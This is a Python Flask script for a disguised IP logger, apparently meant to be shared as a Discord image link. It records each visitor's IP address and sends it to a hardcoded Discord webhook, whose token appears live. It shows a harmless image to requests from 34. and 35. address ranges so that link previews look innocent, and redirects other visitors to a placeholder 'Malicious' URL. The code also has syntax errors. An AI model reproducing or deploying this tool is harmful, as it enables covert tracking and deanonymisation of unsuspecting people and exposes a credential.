import requests, io
from flask import Flask, request, send_file
from discord_webhook import DiscordWebhook

app = Flask(
__name__,
  template_folder='templates',
  static_folder='static'
)
@app.route('/', methods=['GET'])
def main():
  Image = 'https://images-ext-2.discordapp.net/external/SDU81m5QKNOHpojQ1LLLmBx_FtX8bPnD6S1IidnWvsw/https/cdn-longterm.mee6.xyz/plugins/welcome/images/956492466234740776/2ca92045dea3cfc33376de39c16bfd81d26733008261c771340928d92324dcf3.png?width=1440&height=314' #put your image
  
  Malicious = ''
  
  
  if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
    ip = request.environ['REMOTE_ADDR']
  else:
    ip = request.environ['HTTP_X_FORWARDED_FOR']
    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1011490283667591218/lN8aFMEsU_YhWN6l2Y9LcGUcEZgFiHKjOdfZlJcdIfFmum0vFjP33uj8DDEhpUjWdQmY"#put your webhook url
rate_limit_retry=True,
                         content=f'New Ip ||{ip}||')
  response = webhook.execute()

  if ip.startswith('35.') or ip.startswith('34.'):
    
    return send_file(
    io.BytesIO(requests.get(Image).content),
    mimetype='image/jpeg',
    attachment_filename='s.png')
  else:
    return f'''<meta http-equiv="refresh" content="0; url={Malicious}">
               '''+'''
          <script>setTimeout(function() {
            ''' + f'window.location = "{Image}"''''
          }, 8000)</script>''' 
if __name__ == '__main__':
  app.run(
  host='0.0.0.0',
  debug=True,
  port=8080)
